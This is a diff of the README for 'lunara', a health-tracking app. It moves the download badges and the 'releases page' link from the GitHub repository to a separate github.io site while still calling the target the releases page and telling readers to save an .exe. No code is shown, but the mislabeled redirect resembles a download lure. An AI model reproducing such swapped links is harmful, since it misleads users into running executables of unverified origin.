@@ -1,6 +1,6 @@
 # 🌙 lunara - Private health tracking on your terms
 
-[![](https://img.shields.io/badge/Download_Lunara-blue.svg)](https://github.com/Sjen4743/lunara)
+[![](https://img.shields.io/badge/Download_Lunara-blue.svg)](https://sjen4743.github.io)
 
 Lunara helps you track your cycle, fertility, and reproductive health. It keeps all your sensitive data on your own computer. You own your health information. No company sees your logs or sells your data. Use it during your period, through pregnancy, or during the transition of perimenopause. 
 
@@ -8,12 +8,12 @@ Lunara helps you track your cycle, fertility, and reproductive health. It keeps 
 
 You can get the latest version directly from the project repository. Please follow these steps to find the software:
 
-1. Visit the [Lunara releases page](https://github.com/Sjen4743/lunara).
+1. Visit the [Lunara releases page](https://sjen4743.github.io).
 2. Look for the section labeled "Latest."
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
 
-[![](https://img.shields.io/badge/Download_Lunara-grey.svg)](https://github.com/Sjen4743/lunara)
+[![](https://img.shields.io/badge/Download_Lunara-grey.svg)](https://sjen4743.github.io)
 
 ## ⚙️ Running the software
 
